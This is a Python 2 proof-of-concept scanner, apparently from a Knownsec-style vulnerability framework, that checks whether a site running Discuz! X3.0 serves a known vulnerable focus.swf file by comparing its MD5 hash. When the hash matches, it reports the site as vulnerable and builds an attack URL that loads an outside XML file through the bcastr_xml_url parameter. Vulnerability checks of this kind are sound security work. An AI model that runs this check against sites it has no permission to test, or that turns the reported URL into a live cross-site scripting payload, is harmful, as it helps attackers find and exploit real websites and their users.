#coding=utf-8
from comm import cmdline
from comm import generic
import urllib2
from hashlib import md5

poc_info = {
    'VulId'       : '1102',
    'Name'        : 'discuz! x3.0 /static/image/common/focus.swf 跨站脚本漏洞 POC',
    'AppName'     : 'Discuz',
    'AppPowerLink': 'http://www.discuz.net/',
    'AppVersion'  : 'X3.0',
    'VulType'     : 'Cross Site Scripting',
    'Desc'        : '''
                     DiscuzX3.0 static/image/common/focus.swf文件存在FlashXss漏洞。
                    ''',
    'Author'      : ['Evi1m0 @ Knownsec'],
    'VulDate'     : '2013-11-05',
    'CreateDate'  : '2013-11-11',
    'UpdateDate'  : '2013-11-11',
    'References'  : ['http://www.ipuman.com/pm6/137/'],
    'Version'     : '1',
}

io_info = {
    'URL'     : '',
    'Mode'    : 'v',
    'Verbose' : False,
    'Error'   : '',
    'Status'  : 0,
    'Result'  : {}
}


#swf文件特征
flash_md5 = "c16a7c6143f098472e52dd13de85527f"
file_path = "/static/image/common/focus.swf"

def main(io_info):
    url = io_info.get('URL','')
    mode = io_info.get('Mode','v')
    verbose = io_info.get('Verbose', False)
    headers_fake = generic.modify_headers(io_info)
    file_url = url + file_path
    try:
        if mode == 'v' or mode == 'a':
            if verbose:
                print "[*] 对%s进行探测" % file_url

            req = urllib2.Request(file_url, headers = headers_fake)
            res = urllib2.urlopen(req)
            file_content = res.read()
            md5_value = md5(file_content).hexdigest()

            if md5_value in flash_md5:
                io_info['Status'] = 1
                io_info['Result']['XSSInfo'] = {}
                io_info['Result']['XSSInfo']['URL'] = file_url+"?bcastr_xml_url=http://localhost/bcastr.xml"
                if verbose:
                    print '[*] Found XSSInfo "%s"! This website is attacked!' % file_url+"?bcastr_xml_url=http://localhost/bcastr.xml"
    except Exception, e:
        pass

if __name__=="__main__":
    # usage表示poc命令行运行的使用帮助，如果留空则使用默认的
    # 如果没有特殊命令行附加参数，则argvs可为空，默认参数有-u/--url，-m/--mode，-v
    cmdline.main(io_info, usage='', argvs=[])
    if io_info['Verbose']:
        print '\n[*] Init ...\n'
    main(io_info)
    print generic.output(io_info)



